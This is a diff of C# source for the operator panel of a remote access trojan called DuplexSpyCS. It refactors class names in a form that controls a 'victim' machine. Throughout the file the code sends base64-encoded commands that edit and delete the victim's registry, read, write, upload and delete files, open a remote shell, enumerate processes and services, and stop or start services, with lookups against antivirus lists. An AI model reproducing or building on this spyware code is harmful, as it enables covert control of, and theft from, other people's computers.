@@ -25,11 +25,11 @@ namespace DuplexSpyCS
 {
     public partial class frmManager : Form
     {
-        public Victim v;
+        public clsVictim v;
         string current_path;
         frmWindowCapture f_winCap;
         private string file_homedir;
-        private static IniManager ini_manager = C2.ini_manager;
+        private static clsIniManager ini_manager = clsStore.ini_manager;
 
         //File transfer
         public bool g_bUploadFile { get; set; }
@@ -77,7 +77,7 @@ namespace DuplexSpyCS
         private List<ListViewItem> g_lsServLv;
 
         //Config
-        private SettingConfig mgrConfig => C2.settingConfig;
+        private SettingConfig mgrConfig => clsStore.settingConfig;
 
         public frmManager()
         {
@@ -260,7 +260,7 @@ namespace DuplexSpyCS
                 string[] s = row.Split(",");
                 ListViewItem item = new ListViewItem(s[0]);
                 item.SubItems.Add(s[1]);
-                item.SubItems.Add(Crypto.b64D2Str(s[2]));
+                item.SubItems.Add(clsCrypto.b64D2Str(s[2]));
 
                 if (s[1].Contains("WORD") || s[1].Contains("BINARY"))
                     item.ImageIndex = 6;
@@ -333,7 +333,7 @@ namespace DuplexSpyCS
         /// <param name="keyName">Key name of add.</param>
         public void Reg_ReqAddKey(string currentPath, string keyName)
         {
-            v.SendCommand($"reg|add|key|{Crypto.b64E2Str(currentPath)}|{Crypto.b64E2Str(keyName)}");
+            v.SendCommand($"reg|add|key|{clsCrypto.b64E2Str(currentPath)}|{clsCrypto.b64E2Str(keyName)}");
         }
         public void Reg_RespAddKey(int code, string msg)
         {
@@ -352,7 +352,7 @@ namespace DuplexSpyCS
         /// <param name="kind"></param>
         public void Reg_ReqAddValue(string currentPath, string valName, string kind)
         {
-            v.SendCommand($"reg|add|val|{Crypto.b64E2Str(currentPath)}|{Crypto.b64E2Str(valName)}|{kind}");
+            v.SendCommand($"reg|add|val|{clsCrypto.b64E2Str(currentPath)}|{clsCrypto.b64E2Str(valName)}|{kind}");
         }
 
         /// <summary>
@@ -378,7 +378,7 @@ namespace DuplexSpyCS
             switch (valKind)
             {
                 case RegistryValueKind.String:
-                    valPayload = Crypto.b64E2Str((string)valData);
+                    valPayload = clsCrypto.b64E2Str((string)valData);
                     break;
                 case RegistryValueKind.Binary:
                     valPayload = Convert.ToBase64String((byte[])valData);
@@ -390,14 +390,14 @@ namespace DuplexSpyCS
                     valPayload = ((int)valData).ToString();
                     break;
                 case RegistryValueKind.MultiString:
-                    valPayload = Crypto.b64E2Str((string)valData);
+                    valPayload = clsCrypto.b64E2Str((string)valData);
                     break;
                 case RegistryValueKind.ExpandString:
-                    valPayload = Crypto.b64E2Str((string)valData);
+                    valPayload = clsCrypto.b64E2Str((string)valData);
                     break;
             }
 
-            v.SendCommand($"reg|edit|{Crypto.b64E2Str(regFullPath)}|{Crypto.b64E2Str(valName)}|{valKind.ToString()}|{valPayload}");
+            v.SendCommand($"reg|edit|{clsCrypto.b64E2Str(regFullPath)}|{clsCrypto.b64E2Str(valName)}|{valKind.ToString()}|{valPayload}");
         }
 
         /// <summary>
@@ -408,7 +408,7 @@ namespace DuplexSpyCS
         /// <param name="dstPath"></param>
         public void Reg_ReqKeyRename(string keyPath, string srcPath, string dstPath)
         {
-            v.SendCommand($"reg|rename|key|{Crypto.b64E2Str(keyPath)}|{Crypto.b64E2Str(srcPath)}|{Crypto.b64E2Str(dstPath)}");
+            v.SendCommand($"reg|rename|key|{clsCrypto.b64E2Str(keyPath)}|{clsCrypto.b64E2Str(srcPath)}|{clsCrypto.b64E2Str(dstPath)}");
         }
 
         /// <summary>
@@ -427,14 +427,14 @@ namespace DuplexSpyCS
                         break;
                     case 1:
                         MessageBox.Show("Action successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                        ((frmRegKeyRename)C1.GetFormByVictim(v, Function.RegRenameKey)).Close();
+                        ((frmRegKeyRename)clsTools.GetFormByVictim(v, Function.RegRenameKey)).Close();
                         break;
                 }
             }));
         }
         public void Reg_ReqValueRename(string currentPath, string originalName, string newName)
         {
-            v.SendCommand($"reg|rename|val|{Crypto.b64E2Str(originalName)}|{Crypto.b64E2Str(newName)}");
+            v.SendCommand($"reg|rename|val|{clsCrypto.b64E2Str(originalName)}|{clsCrypto.b64E2Str(newName)}");
         }
         public void Reg_RespValueRename(int code, string msg)
         {
@@ -458,7 +458,7 @@ namespace DuplexSpyCS
         /// <param name="currentPath"></param>
         public void Reg_ReqKeyDelete(string currentPath)
         {
-            v.SendCommand($"reg|del|key|{Crypto.b64E2Str(currentPath)}");
+            v.SendCommand($"reg|del|key|{clsCrypto.b64E2Str(currentPath)}");
         }
 
         /// <summary>
@@ -481,8 +481,8 @@ namespace DuplexSpyCS
         /// <param name="valNames"></param>
         public void Reg_ReqValueDelete(string currentPath, string[] valNames)
         {
-            string valNamePayload = string.Join(",", valNames.Select(x => Crypto.b64E2Str(x)).ToArray());
-            v.SendCommand($"reg|del|val|{Crypto.b64E2Str(currentPath)}|{valNamePayload}");
+            string valNamePayload = string.Join(",", valNames.Select(x => clsCrypto.b64E2Str(x)).ToArray());
+            v.SendCommand($"reg|del|val|{clsCrypto.b64E2Str(currentPath)}|{valNamePayload}");
         }
 
         /// <summary>
@@ -522,7 +522,7 @@ namespace DuplexSpyCS
             if (sfd.ShowDialog() == DialogResult.OK)
             {
                 string path = (string)textBox2.Tag;
-                v.encSend(2, 0, $@"reg|export|{Crypto.b64E2Str(path)}|{Crypto.b64E2Str(sfd.FileName)}");
+                v.encSend(2, 0, $@"reg|export|{clsCrypto.b64E2Str(path)}|{clsCrypto.b64E2Str(sfd.FileName)}");
             }
         }
 
@@ -734,7 +734,7 @@ namespace DuplexSpyCS
                     treeView1.SelectedNode = current_node;
 
                 //SHORT CUT
-                List<string> shortCuts = strShortCuts.Split(",").Select(x => Crypto.b64D2Str(x)).ToList();
+                List<string> shortCuts = strShortCuts.Split(",").Select(x => clsCrypto.b64D2Str(x)).ToList();
                 foreach (string s in shortCuts)
                 {
                     //FIND DRIVER TREE NODE
@@ -764,7 +764,7 @@ namespace DuplexSpyCS
                 treeView6.ExpandAll();
 
                 //Show Information
-                string[] infoPayload = info.Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
+                string[] infoPayload = info.Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
                 foreach (string s in infoPayload)
                 {
                     string key = s.Split(";")[0];
@@ -1001,13 +1001,13 @@ namespace DuplexSpyCS
                     string ext = Path.GetExtension(s[0]);
                     Invoke(new Action(() =>
                     {
-                        if (!C2.il_extension.Images.ContainsKey(ext))
+                        if (!clsStore.il_extension.Images.ContainsKey(ext))
                         {
                             string temp_file = Path.GetTempPath() + Guid.NewGuid().ToString() + $"{ext}";
                             File.Create(temp_file).Close();
                             Icon icon = Icon.ExtractAssociatedIcon(temp_file);
                             File.Delete(temp_file);
-                            C2.il_extension.Images.Add(ext, icon);
+                            clsStore.il_extension.Images.Add(ext, icon);
                         }
                     }));
                     item.ImageKey = ext;
@@ -1046,10 +1046,10 @@ namespace DuplexSpyCS
         /// <param name="d2">File content with base-64 encoded.</param>
         public void File_Read(string code, string d1, string d2)
         {
-            string path = Crypto.b64D2Str(d1);
-            string text = Crypto.b64D2Str(d2);
+            string path = clsCrypto.b64D2Str(d1);
+            string text = clsCrypto.b64D2Str(d2);
 
-            frmTextEditor f_editor = (frmTextEditor)C1.GetFormByVictim(v, Function.TextEditor);
+            frmTextEditor f_editor = (frmTextEditor)clsTools.GetFormByVictim(v, Function.TextEditor);
 
             if (f_editor == null || f_editor.IsDisposed)
             {
@@ -1075,10 +1075,10 @@ namespace DuplexSpyCS
         /// <param name="data">code=0: Error message;code=1: Message of write file successfully</param>
         public void File_Write(string code, string data)
         {
-            string msg = Crypto.b64D2Str(data);
+            string msg = clsCrypto.b64D2Str(data);
             if (code == "1") //OK
             {
-                frmTextEditor f = (frmTextEditor)C1.GetFormByVictim(v, Function.TextEditor);
+                frmTextEditor f = (frmTextEditor)clsTools.GetFormByVictim(v, Function.TextEditor);
                 if (f == null)
                     return;
 
@@ -1102,7 +1102,7 @@ namespace DuplexSpyCS
                 if (objs.Length == 2 && objs[1] == "f")
                 {
                     string path = objs[0];
-                    v.encSend(2, 0, $"file|read|" + Crypto.b64E2Str(path));
+                    v.encSend(2, 0, $"file|read|" + clsCrypto.b64E2Str(path));
                 }
             }));
         }
@@ -1179,7 +1179,7 @@ namespace DuplexSpyCS
                             "uf",
                             szFlag,
                             "recv",
-                            Crypto.b64E2Str(tgt_filename),
+                            clsCrypto.b64E2Str(tgt_filename),
                             file_len.ToString(), //FILE BYTES LENGTH
                             (i * chunk_size).ToString(), //OFFSET
                             b64_data, //BASE-64 FILE DATA
@@ -1215,7 +1215,7 @@ namespace DuplexSpyCS
             string data = string.Join(",", l_path
                 .Select(x => x[1])
                 .Where(x => !string.IsNullOrEmpty(x))
-                .Select(x => Crypto.b64E2Str(x)).ToArray()
+                .Select(x => clsCrypto.b64E2Str(x)).ToArray()
                 );
 
             v.encSend(2, 0, "file|df|send|" + data);
@@ -1238,13 +1238,13 @@ namespace DuplexSpyCS
 
                     filename.AddRange(items
                             .Select(x => File_GetItemObj(x)[0])
-                            .Where(x => C2.FileIsImage(x))
-                            .Select(x => Crypto.b64E2Str(x))
+                            .Where(x => clsTools.FileIsImage(x))
+                            .Select(x => clsCrypto.b64E2Str(x))
                             .ToArray());
 
                 }));
 
-                Form tmp = C1.GetFormByVictim(v, Function.FileImage);
+                Form tmp = clsTools.GetFormByVictim(v, Function.FileImage);
                 frmFileShowImg f;
                 if (tmp == null)
                 {
@@ -1267,7 +1267,7 @@ namespace DuplexSpyCS
         /// <param name="data">Image file with base-64 encoded.</param>
         public void File_ShowImage(string data)
         {
-            Form tmp = C1.GetFormByVictim(v, Function.FileImage);
+            Form tmp = clsTools.GetFormByVictim(v, Function.FileImage);
             frmFileShowImg f;
             new Thread(() =>
             {
@@ -1292,8 +1292,8 @@ namespace DuplexSpyCS
                             continue;
 
                         string[] s = item.Split(';');
-                        string filename = Crypto.b64D2Str(s[0]);
-                        Image img = C1.Base64ToImage(s[1]);
+                        string filename = clsCrypto.b64D2Str(s[0]);
+                        Image img = clsTools.Base64ToImage(s[1]);
                         Invoke(new Action(() => f.ShowImage(filename, img)));
                     }
                 }
@@ -1310,7 +1310,7 @@ namespace DuplexSpyCS
         /// <param name="folder">True: Folder; False: File</param>
         private void File_NewItem(bool folder)
         {
-            frmFileMgrNew f = (frmFileMgrNew)C1.GetFormByVictim(v, Function.FileNewItem);
+            frmFileMgrNew f = (frmFileMgrNew)clsTools.GetFormByVictim(v, Function.FileNewItem);
             try
             {
                 if (f == null)
@@ -1353,8 +1353,8 @@ namespace DuplexSpyCS
             f.Text = $@"File Delete\\{v.ID}";
             f.Show();
 
-            folders = folders.Select(x => Crypto.b64E2Str(x)).ToArray();
-            files = files.Select(x => Crypto.b64E2Str(x)).ToArray();
+            folders = folders.Select(x => clsCrypto.b64E2Str(x)).ToArray();
+            files = files.Select(x => clsCrypto.b64E2Str(x)).ToArray();
 
             DialogResult dia = MessageBox.Show($"Do you want to delete {files.Length} item{(files.Length > 1 ? "s" : string.Empty)} ?", "Sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
             if (dia == DialogResult.Yes)
@@ -1371,7 +1371,7 @@ namespace DuplexSpyCS
         /// <param name="d2">Folder state.</param>
         private void File_ShowDeleteState(string d1, string d2)
         {
-            frmFileDelState f = (frmFileDelState)C1.GetFormByVictim(v, Function.FileDelState);
+            frmFileDelState f = (frmFileDelState)clsTools.GetFormByVictim(v, Function.FileDelState);
             if (f == null)
                 return;
 
@@ -1380,8 +1380,8 @@ namespace DuplexSpyCS
                 return d.Split(',').Select(x => x.Split(';')).Select(x => new string[]
                 {
                     x[0],
-                    Crypto.b64D2Str(x[1]),
-                    Crypto.b64D2Str(x[2]),
+                    clsCrypto.b64D2Str(x[1]),
+                    clsCrypto.b64D2Str(x[2]),
                 }).ToList();
             }
 
@@ -1467,8 +1467,8 @@ namespace DuplexSpyCS
                 items = l_CopyClipboard;
             }
 
-            string[] folders = items.Where(x => x[0] == "d").Select(x => Crypto.b64E2Str(x[1])).ToArray();
-            string[] files = items.Where(x => x[0] == "f").Select(x => Crypto.b64E2Str(x[1])).ToArray();
+            string[] folders = items.Where(x => x[0] == "d").Select(x => clsCrypto.b64E2Str(x[1])).ToArray();
+            string[] files = items.Where(x => x[0] == "f").Select(x => clsCrypto.b64E2Str(x[1])).ToArray();
 
             frmFilePaste f = new frmFilePaste();
             f.Tag = Function.FilePaste;
@@ -1477,7 +1477,7 @@ namespace DuplexSpyCS
             f.Text = @$"File Clipboard\\{v.ID}";
             f.Show();
 
-            v.encSend(2, 0, $"file|paste|{type}|{string.Join(",", folders)}|{string.Join(",", files)}|{Crypto.b64E2Str(textBox1.Tag.ToString())}");
+            v.encSend(2, 0, $"file|paste|{type}|{string.Join(",", folders)}|{string.Join(",", files)}|{clsCrypto.b64E2Str(textBox1.Tag.ToString())}");
         }
 
         /// <summary>
@@ -1622,7 +1622,7 @@ namespace DuplexSpyCS
                 return;
             }
 
-            frmFileWGET f = (frmFileWGET)C1.GetFormByVictim(v, Function.FileWGET);
+            frmFileWGET f = (frmFileWGET)clsTools.GetFormByVictim(v, Function.FileWGET);
             if (f == null)
                 return;
 
@@ -1739,7 +1739,7 @@ namespace DuplexSpyCS
             listView2.Items.Clear();
             treeView2.Nodes.Clear();
 
-            v.encSend(2, 0, $"task|init|{Crypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
+            v.encSend(2, 0, $"task|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
         }
         /// <summary>
         /// "TaskMgr" function initialization.
@@ -1762,7 +1762,7 @@ namespace DuplexSpyCS
             bool column_changed = false;
             foreach (string row in data.Split(','))
             {
-                List<string[]> tmp = Crypto.b64D2Str(row).Split(',').Select(x => Crypto.b64D2Str(x).Split(';')).ToList();
+                List<string[]> tmp = clsCrypto.b64D2Str(row).Split(',').Select(x => clsCrypto.b64D2Str(x).Split(';')).ToList();
                 string[] props = dic_fields["task"];
                 string[][] _tmp = tmp.Where(x => string.Equals(x[0], props[0], StringComparison.CurrentCultureIgnoreCase)).ToArray();
                 ListViewItem item = new ListViewItem(_tmp[0][1]);
@@ -1882,7 +1882,7 @@ namespace DuplexSpyCS
             listView3.Items.Clear();
             richTextBox1.Text = string.Empty;
 
-            v.encSend(2, 0, $"serv|init|{Crypto.b64E2Str($"select {string.Join(",", dic_fields["serv"])} from win32_service")}");
+            v.encSend(2, 0, $"serv|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["serv"])} from win32_service")}");
         }
         /// <summary>
         /// "Service" function initialization.
@@ -1905,7 +1905,7 @@ namespace DuplexSpyCS
             bool column_changed = false;
             foreach (string row in data.Split(','))
             {
-                List<string[]> tmp = Crypto.b64D2Str(row).Split(',').Select(x => Crypto.b64D2Str(x).Split(';')).ToList();
+                List<string[]> tmp = clsCrypto.b64D2Str(row).Split(',').Select(x => clsCrypto.b64D2Str(x).Split(';')).ToList();
                 string[] props = dic_fields["serv"];
                 string[][] _tmp = tmp.Where(x => string.Equals(x[0], props[0], StringComparison.CurrentCultureIgnoreCase)).ToArray();
                 ListViewItem item = new ListViewItem(_tmp[0][1]);
@@ -1932,7 +1932,7 @@ namespace DuplexSpyCS
         }
         private string[] Serv_GetNames()
         {
-            string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => Crypto.b64E2Str(x.Text)).ToArray();
+            string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => clsCrypto.b64E2Str(x.Text)).ToArray();
             return names;
         }
         private void Serv_ReqStart(bool start)
@@ -2015,11 +2015,11 @@ namespace DuplexSpyCS
 
         void setup()
         {
-            listView1.SmallImageList = C2.il_extension;
-            listView1.LargeImageList = C2.il_extension;
-            C2.il_extension.ImageSize = new Size(25, 25);
-            C2.il_extension.ColorDepth = ColorDepth.Depth32Bit;
-            C2.il_extension.Images.Add("folder", imageList1.Images[0]);
+            listView1.SmallImageList = clsStore.il_extension;
+            listView1.LargeImageList = clsStore.il_extension;
+            clsStore.il_extension.ImageSize = new Size(25, 25);
+            clsStore.il_extension.ColorDepth = ColorDepth.Depth32Bit;
+            clsStore.il_extension.Images.Add("folder", imageList1.Images[0]);
             tabControl2.SelectedIndex = 1;
 
             //Reg
@@ -2076,7 +2076,7 @@ namespace DuplexSpyCS
         {
             if (e.KeyCode == Keys.Enter)
             {
-                v.SendCommand($"file|goto|{Crypto.b64E2Str(textBox1.Text)}");
+                v.SendCommand($"file|goto|{clsCrypto.b64E2Str(textBox1.Text)}");
             }
         }
 
@@ -2095,7 +2095,7 @@ namespace DuplexSpyCS
                 string[] s = node.FullPath.Split("\\");
                 string root = s[1];
                 string node_path = string.Join("\\", s[2..]);
-                v.encSend(2, 0, $"reg|item|{root}|" + Crypto.b64E2Str(node_path));
+                v.encSend(2, 0, $"reg|item|{root}|" + clsCrypto.b64E2Str(node_path));
             }
             catch (Exception ex)
             {
@@ -2111,7 +2111,7 @@ namespace DuplexSpyCS
                 string[] s = path.Split("\\");
                 string root = s[1];
                 path = string.Join("\\", s[2..]);
-                v.encSend(2, 0, $"reg|goto|{root}|{Crypto.b64E2Str(path)}");
+                v.encSend(2, 0, $"reg|goto|{root}|{clsCrypto.b64E2Str(path)}");
             }
         }
 
@@ -2151,7 +2151,7 @@ namespace DuplexSpyCS
             string files = string.Join(",",
                 items.Select(x => File_GetItemObj(x))
                 .Where(x => x[1] == "f")
-                .Select(x => Crypto.b64E2Str(x[0]))
+                .Select(x => clsCrypto.b64E2Str(x[0]))
                 .ToArray()
                 );
 
@@ -2313,7 +2313,7 @@ namespace DuplexSpyCS
         //OPEN SHELL IN CURRENT DIRECTORY
         private void toolStripButton4_Click(object sender, EventArgs e)
         {
-            frmShell f = (frmShell)C1.GetFormByVictim(v, Function.Shell);
+            frmShell f = (frmShell)clsTools.GetFormByVictim(v, Function.Shell);
             if (f == null)
                 f = new frmShell(current_path);
             f.v = v;
@@ -2553,35 +2553,35 @@ namespace DuplexSpyCS
         private void toolStripMenuItem30_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
-            string b64Names = string.Join(",", names.Select(x => Crypto.b64E2Str(x)).ToArray());
+            string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
             v.encSend(2, 0, $"serv|control|{b64Names}|Running");
         }
         //SERVICE - STOP
         private void toolStripMenuItem13_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
-            string b64Names = string.Join(",", names.Select(x => Crypto.b64E2Str(x)).ToArray());
+            string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
             v.encSend(2, 0, $"serv|control|{b64Names}|Stopped");
         }
         //SERVICE - PAUSE
         private void toolStripMenuItem12_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
-            string b64Names = string.Join(",", names.Select(x => Crypto.b64E2Str(x)).ToArray());
+            string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
             v.encSend(2, 0, $"serv|control|{b64Names}|Paused");
         }
         //SERVICE - RESUME
         private void toolStripMenuItem31_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
-            string b64Names = string.Join(",", names.Select(x => Crypto.b64E2Str(x)).ToArray());
+            string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
             v.encSend(2, 0, $"serv|control|{b64Names}|Running");
         }
         //SERVICE - RESTART
         private void toolStripMenuItem32_Click(object sender, EventArgs e)
         {
             string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => x.Text).ToArray();
-            string b64Names = string.Join(",", names.Select(x => Crypto.b64E2Str(x)).ToArray());
+            string b64Names = string.Join(",", names.Select(x => clsCrypto.b64E2Str(x)).ToArray());
             v.encSend(2, 0, $"serv|control|{b64Names}|restart");
         }
 
@@ -2840,7 +2840,7 @@ namespace DuplexSpyCS
         private void toolStripMenuItem49_Click(object sender, EventArgs e)
         {
             //Get ini config.
-            SettingConfig config = C1.GetConfigFromINI();
+            SettingConfig config = clsTools.GetConfigFromINI();
 
             //Check json file exists.
             string szJsonFile = config.taskMgr_szAVjson;
@@ -2888,7 +2888,7 @@ namespace DuplexSpyCS
         private void toolStripMenuItem14_Click(object sender, EventArgs e)
         {
             //Get ini config.
-            SettingConfig config = C1.GetConfigFromINI();
+            SettingConfig config = clsTools.GetConfigFromINI();
 
             //Check json file exists.
             string szJsonFile = config.servMgr_szAVjson;
@@ -3017,7 +3017,7 @@ namespace DuplexSpyCS
         private void toolStripMenuItem15_Click(object sender, EventArgs e)
         {
             SaveFileDialog sfd = new SaveFileDialog();
-            sfd.FileName = C1.GenerateFileName("txt");
+            sfd.FileName = clsTools.GenerateFileName("txt");
             if (sfd.ShowDialog() == DialogResult.OK)
             {
                 try
